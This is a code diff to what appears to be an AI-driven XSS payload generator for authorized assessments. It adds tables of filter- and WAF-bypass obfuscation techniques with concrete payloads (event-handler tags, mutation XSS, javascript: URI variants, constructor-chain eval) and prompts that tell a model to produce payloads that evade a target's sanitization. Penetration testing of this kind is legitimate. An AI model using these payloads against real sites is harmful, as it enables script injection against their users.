@@ -657,6 +657,128 @@ def _similar_findings_examples(
     ]
 
 
+_OBFUSCATION_TECHNIQUES: dict[str, str] = {
+    "html_body": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Uncommon tags: <details open ontoggle=...>, <video onloadstart=...>, <svg onload=...>, <marquee onstart=...>\n"
+        "- Case/space variants: <ImG sRc=x OnErRoR=alert(1)>, unquoted attributes\n"
+        "- Mutation XSS (mXSS): </sty</style>le><img ...>, <listing><img ...></listing> — parser re-parses mangled markup\n"
+        "- Namespace confusion: SVG/MathML as context escapes — </p><svg><script>, <math><mtext><img ...>\n"
+        "- CSS context escape: </style><img src=x onerror=alert(1)>\n"
+        "- Encoded attribute names: &#x6f;nerror, &#111;nerror\n"
+    ),
+    "html_attr_value": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Attribute breakout: close the quote, inject handler — \" onmouseover=alert(1) x=\"\n"
+        "- Angle-bracket-free: stay inside the attribute, no < > needed — works when angle brackets are stripped\n"
+        "- Autofocus gadget: \" autofocus onfocus=alert(1) x=\" — fires on load, no click\n"
+        "- Case variants on handlers: OnMoUsEoVeR=, oNfOcUs=, OnInPuT=\n"
+        "- Entity-encoded quotes: &#x22; or &quot; to bypass quote filters\n"
+    ),
+    "html_attr_url": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- javascript: URI variants: jaVasCript:, java\\tscript: (tab in scheme)\n"
+        "- Leading whitespace bypass: \\x09javascript:, \\x0ajavascript:\n"
+        "- data: URI fallback: data:text/html,<script>alert(1)</script>\n"
+        "- Attribute breakout if quote survives: \" onmouseover=alert(1) href=\"#\n"
+        "- HTML entity in URL: &#106;avascript:\n"
+    ),
+    "js_string_dq": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Quote breakout: \\\"; to escape the double-quoted string\n"
+        "- Keyword splitting: 'al'+'ert'(1), top['al'+'ert'](1)\n"
+        "- Unicode function names: \\u0061lert(1), \\x61lert(1)\n"
+        "- Constructor chain: []['filter']['constructor']('alert(1)')()\n"
+        "- Nested template literal: `${`${alert(1)}`}` if backtick context is reachable\n"
+    ),
+    "js_string_sq": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Quote breakout: '; to escape the single-quoted string\n"
+        "- Keyword splitting: 'al'+'ert'(1), window['al'+'ert'](1)\n"
+        "- Unicode function names: \\u0061lert(1), \\x61lert(1)\n"
+        "- Constructor chain: []['filter']['constructor']('alert(1)')()\n"
+        "- Nested template literal: `${`${alert(1)}`}` if backtick context is reachable\n"
+    ),
+    "js_code": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Function constructor: Function('alert(1)')()\n"
+        "- Indirect eval: (0,eval)('alert(1)')\n"
+        "- Tagged template literal: Set.constructor`alert\\x281\\x29`()\n"
+        "- Prototype gadget: []['filter']['constructor']('alert(1)')()\n"
+        "- Unicode/hex function names: \\u0061lert, \\x61lert\n"
+        "- Nested template: `${`${alert(1)}`}`\n"
+    ),
+    "html_comment": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Comment close breakout: --> or --!>\n"
+        "- Malformed comment escape: --><img src=x onerror=alert(1)>\n"
+    ),
+}
+
+_OBFUSCATION_TECHNIQUES_FALLBACK = (
+    "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+    "- HTML tag injection: SVG, MathML, uncommon HTML5 elements\n"
+    "- Encoding variants: HTML entities, Unicode escapes, URL percent-encoding\n"
+    "- Angle-bracket-free event handlers for attribute contexts\n"
+    "- Constructor/prototype gadgets for JS execution contexts\n"
+)
+
+
+def _obfuscation_techniques_section(context_type: str) -> str:
+    normalized = _normalized_context_label(context_type)
+    return _OBFUSCATION_TECHNIQUES.get(normalized, _OBFUSCATION_TECHNIQUES_FALLBACK)
+
+
+def _application_signals_section(
+    context_type: str,
+    surviving_chars: str,
+    waf: str | None,
+    past_lessons: list[Any] | None,
+    strategy_hint: str | None,
+    context: "ParsedContext | None" = None,
+) -> str:
+    """Focused application observations for deep mode — replaces fat planning/context envelopes."""
+    lines = [
+        f"Reflection context: {context_type or 'unknown'}",
+        f"Surviving chars: {surviving_chars or '(none confirmed)'}",
+    ]
+    if waf:
+        lines.append(f"WAF/filter: {waf}")
+
+    feedback = _execution_feedback_data(past_lessons)
+    if feedback:
+        blockers = [str(b) for b in (feedback.get("edge_blockers") or [])[:3] if b]
+        if blockers:
+            lines.append(f"Observed blockers: {', '.join(blockers)}")
+        outcomes = [str(o) for o in (feedback.get("delivery_outcomes") or [])[:2] if o]
+        if outcomes:
+            lines.append(f"Filter responses: {', '.join(outcomes)}")
+
+    section = "WHAT WE KNOW ABOUT THIS APPLICATION:\n"
+    section += "\n".join(f"  {line}" for line in lines) + "\n"
+
+    # Include reflection structure and DOM runtime if available — high-value for targeted payloads
+    if context is not None:
+        dom_runtime = _extract_dom_runtime_context(context)
+        if dom_runtime:
+            section += "DOM RUNTIME:\n" + json.dumps(dom_runtime, indent=2) + "\n"
+        else:
+            reflected_subcontext = _extract_reflected_subcontext(context, desired_context=context_type)
+            if reflected_subcontext:
+                section += "REFLECTION STRUCTURE:\n" + json.dumps(reflected_subcontext, indent=2) + "\n"
+
+    observations = [str(o) for o in (feedback.get("observations") or [])[:2] if o] if feedback else []
+    if observations:
+        section += "OBSERVED BEHAVIOUR:\n"
+        section += "\n".join(f"  - {obs}" for obs in observations) + "\n"
+
+    hint = str(strategy_hint or "").strip()
+    if hint:
+        section += f"STRATEGY NOTE: {hint}\n"
+
+    return section
+
+
 def _similar_findings_section(
     past_findings: list[Finding] | None,
     *,
@@ -682,11 +804,27 @@ def _seed_examples_for_context(
     context_type: str,
     surviving_chars: str,
     reference_payloads: list[Any] | None,
+    waf: str | None = None,
 ) -> list[dict[str, Any]]:
+    # External reference payloads (e.g. from --public) take priority — they
+    # are already curated by the caller and represent the most relevant examples.
     reference_examples = _reference_payload_examples(reference_payloads, limit=5)
     if reference_examples:
         return reference_examples
 
+    # Multi-tier seed pool: bootstrap (always) + survived WAF bypass + confirmed
+    # This is the primary seed source for every scan.
+    try:
+        from ai_xss_generator.seed_pool import SeedPool
+        pool = SeedPool()
+        pool_seeds = pool.select_seeds(context_type, waf=waf, n=6)
+        if pool_seeds:
+            return pool_seeds
+    except Exception:
+        pass
+
+    # Final fallback: static BASE_PAYLOADS (older path, still useful if pool
+    # fails to load for any reason)
     seeds = _match_payloads_to_context(list(BASE_PAYLOADS), context_type, surviving_chars)
     return [
         {
@@ -703,11 +841,13 @@ def _seed_examples_section(
     context_type: str,
     surviving_chars: str,
     reference_payloads: list[Any] | None,
+    waf: str | None = None,
 ) -> str:
     examples = _seed_examples_for_context(
         context_type=context_type,
         surviving_chars=surviving_chars,
         reference_payloads=reference_payloads,
+        waf=waf,
     )
     if not examples:
         return ""
@@ -835,45 +975,50 @@ def _prompt_for_generation_phase(
         context_type=context_type,
         surviving_chars=surviving_chars,
         reference_payloads=reference_payloads,
+        waf=waf,
     )
     if phase == "scout":
+        obfuscation_section = _obfuscation_techniques_section(context_type)
         return (
-            "You are helping with an authorized XSS assessment. Generate payloads, not analysis.\n"
-            "Return ONLY strict JSON with a top-level {\"payloads\": [...]}.\n\n"
+            "You are an authorized XSS assessor. Generate payloads only — no analysis.\n"
+            "Return ONLY strict JSON: {\"payloads\": [...]}.\n\n"
             + "\n".join(probe_lines)
             + "\n"
-            "Only special-character survival is measured; do not assume letters or digits are blocked.\n"
-            "Task: produce 3-5 concise payloads likely to execute in this exact context.\n"
-            "Use the seed payloads as inspiration and mutate them for this context.\n"
-            "Each payload object must include payload, title, test_vector, bypass_family.\n"
+            + obfuscation_section
+            + "Task: produce 5-8 payloads that apply the techniques above to this exact context.\n"
+            "Use seeds as few-shot grounding — mutate and combine techniques, do not copy seeds verbatim.\n"
+            "Each payload must include: payload, title, test_vector, bypass_family.\n"
             + scout_context_envelope_section
             + seed_section
-            + success_envelope_section
-            + failure_envelope_section
         ).strip()
 
     findings_section = _similar_findings_section(
         past_findings,
         context_type=context_type,
-        limit=5,
+        limit=3,
+    )
+    app_signals_section = _application_signals_section(
+        context_type=context_type,
+        surviving_chars=surviving_chars,
+        waf=waf,
+        past_lessons=past_lessons,
+        strategy_hint=strategy_hint,
+        context=context,
     )
     return (
-        "You are helping with an authorized XSS assessment. Generate XSS payloads, not analysis.\n"
-        "Return ONLY strict JSON with a top-level {\"payloads\": [...]}.\n\n"
-        + "\n".join(probe_lines)
-        + "\n"
-        "Only special-character survival is measured; do not assume letters or digits are blocked.\n"
-        "Task: produce 4-6 payloads that are likely to execute in this exact context.\n"
-        "Past successful payloads are the primary few-shot examples: mutate them, do not repeat them exactly.\n"
-        "Prefer materially distinct candidates. Keep the output compact and execution-focused.\n"
-        "Each payload object must include payload, title, explanation, test_vector, tags, target_sink, bypass_family, risk_score.\n"
-        + context_envelope_section
-        + planning_envelope_section
-        + seed_section
+        "You are an authorized XSS assessor. The fast scan did not confirm execution.\n"
+        "Reason about what this specific application blocks and allows. Generate payloads only — no analysis.\n"
+        "Return ONLY strict JSON: {\"payloads\": [...]}.\n\n"
+        + app_signals_section
         + success_envelope_section
         + failure_envelope_section
         + findings_section
+        + seed_section
         + auth_section
+        + "Task: produce 6-8 payloads that work around what this application blocks.\n"
+        "Use the application signals above to reason about what survives sanitization.\n"
+        "Prefer materially distinct techniques. Target this application specifically.\n"
+        "Each payload must include: payload, title, explanation, test_vector, tags, target_sink, bypass_family, risk_score.\n"
     ).strip()
 
 
@@ -904,6 +1049,7 @@ def _compact_reflected_research_prompt(
         context_type=context_type,
         surviving_chars=surviving_chars,
         reference_payloads=reference_payloads,
+        waf=waf,
     )
     auth_section = ""
     if context.auth_notes:
@@ -1044,6 +1190,7 @@ def _compact_dom_prompt_for_local(
         context_type="dom_xss",
         surviving_chars="",
         reference_payloads=reference_payloads,
+        waf=waf,
     )
 
     context_summary = {
